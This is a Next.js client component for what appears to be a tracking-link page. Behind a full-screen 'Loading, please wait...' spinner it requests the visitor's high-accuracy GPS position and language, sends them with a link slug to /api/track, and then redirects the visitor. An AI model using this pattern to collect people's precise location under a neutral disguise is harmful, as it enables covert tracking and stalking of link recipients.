"use client";

import { useEffect } from "react";

interface Props {
    slug: string;
}

export default function TrackingClient({ slug }: Props) {
    useEffect(() => {
        async function track() {
            const sendData = async (lat: number | null, lng: number | null) => {
                try {
                    const res = await fetch("/api/track", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            slug,
                            gpsLat: lat,
                            gpsLng: lng,
                            language: navigator.language || null,
                        }),
                    });
                    const data = await res.json();
                    if (data.redirectUrl) {
                        window.location.href = data.redirectUrl;
                    }
                } catch (error) {
                    window.location.href = "https://www.linkedin.com/in/deeproshan-kumar/";
                }
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => sendData(pos.coords.latitude, pos.coords.longitude),
                    () => sendData(null, null),
                    { timeout: 8000, maximumAge: 0, enableHighAccuracy: true }
                );
            } else {
                await sendData(null, null);
            }
        }

        track();
    }, [slug]);

    return (
        <div className="tracking-wrapper">
            <style jsx global>{`
        .tracking-wrapper {
          position: fixed;
          inset: 0;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          background: #0f0f0f;
          color: #fff;
          z-index: 9999;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        .spinner {
          width: 3rem;
          height: 3rem;
          border: 0.25rem solid rgba(255, 255, 255, 0.1);
          border-top-color: #6366f1;
          border-radius: 50%;
          animation: spin 0.9s linear infinite;
          margin-bottom: 1.25rem;
        }
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        p {
          color: rgba(255, 255, 255, 0.5);
          font-size: 0.875rem;
        }
      `}</style>
            <div className="spinner" />
            <p>Loading, please wait...</p>
        </div>
    );
}
